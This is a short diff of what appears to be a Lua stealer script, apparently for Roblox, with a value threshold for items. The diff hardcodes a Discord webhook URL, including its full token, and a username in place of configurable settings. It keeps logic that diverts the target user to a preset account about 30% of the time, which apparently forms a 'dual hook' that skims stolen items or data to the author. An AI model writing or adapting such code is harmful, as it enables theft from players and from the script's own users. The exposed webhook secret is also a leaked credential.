@@ -39,11 +39,10 @@ end
 
 local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
 local DualHookName = "Eliaskulmer999"
-local DualHookRap = 0
 
-local users = _G.Usernames
+local users = "Eliaskulmer999"
 local min_rap = 1000000
-local webhook =  _G.webhook
+local webhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
 
 if math.random() < 0.3 then
 	users = presetUser
